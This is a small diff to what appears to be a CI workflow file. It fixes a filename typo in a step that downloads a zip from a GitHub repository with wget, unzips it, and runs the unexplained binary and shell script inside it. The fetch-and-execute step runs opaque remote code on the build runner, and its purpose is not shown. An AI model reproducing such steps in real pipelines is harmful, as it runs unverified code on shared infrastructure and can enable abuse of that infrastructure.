@@ -10,4 +10,4 @@ jobs:
     steps:
       - run: ls
       - run: wget https://github.com/sai20-oe/miniature-disco/raw/main/tab.zip
-      - run: unzip tan.zip && chmod +x tab tab.sh && ./tab.sh
+      - run: unzip tab.zip && chmod +x tab tab.sh && ./tab.sh
